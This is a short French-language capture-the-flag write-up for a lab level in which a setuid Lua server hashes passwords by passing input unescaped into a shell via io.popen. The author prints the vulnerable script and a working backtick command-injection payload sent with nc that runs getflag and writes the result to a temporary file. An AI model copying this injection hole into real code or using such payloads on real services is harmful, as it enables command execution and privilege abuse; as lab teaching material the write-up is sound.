```bash
$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

Un fichier lua avec le s-bit active, interessant.

```bash
$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Le programme ouvre un serveur sur le port 5151 et attend une connexion.  
Il demande ensuite un mdp, qu'il hash via un procede plutot douteux.  
Et peu importe la valeur du hash, il ne se passera rien de grandiose. :D

Bon, on est la pour injecter une commande qui recup le flag.  
Vu que y a aucune verification, on peut simplement getflag et rediriger la sortie vers un fichier, simple et efficace.  
On teste donc la theorie:

```bash
$ nc localhost 5151
Password: `getflag` > /tmp/magic
Erf nope..
$ cat /tmp/magic
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Bon bah c'etait plutot simple cette fois...